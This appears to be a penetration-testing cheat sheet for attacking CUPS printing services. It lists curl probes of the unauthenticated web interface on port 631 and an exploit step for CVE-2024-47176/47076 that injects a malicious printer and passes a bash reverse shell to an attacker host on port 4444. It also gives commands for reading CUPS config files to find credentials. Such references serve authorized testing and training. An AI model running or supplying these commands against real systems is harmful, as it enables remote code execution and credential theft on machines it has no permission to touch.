# CUPS (Printing)

**What it is:** Common Unix Printing System — manages printers on Linux/macOS. The web interface is often accessible without authentication and has had multiple RCE vulnerabilities.

**Default ports:** 631

**Vuln research:**
- [CUPS Security](https://www.cups.org/security.html)
- [SearchSploit: `searchsploit cups`](https://www.exploit-db.com/search?q=cups)

---

### Access CUPS web interface

Often unauthenticated — Information disclosure

```bash
curl http://$IP:631/
curl http://$IP:631/printers
curl http://$IP:631/admin
```

---

### CUPS RCE (CVE-2024-47176 / CVE-2024-47076)

cups-browsed unauthenticated RCE — Inject malicious printer

```bash
# If cups-browsed is listening on UDP 631:
# Send crafted IPP request to add malicious printer
# When a user prints, your command executes
python3 cups_rce.py $IP $LHOST "bash -i >& /dev/tcp/$LHOST/4444 0>&1"
```

---

### Read CUPS config

Configuration may reveal users and credentials

```bash
cat /etc/cups/cupsd.conf
cat /etc/cups/printers.conf
# Look for: AuthType, SystemGroup, device URIs with credentials
```

---
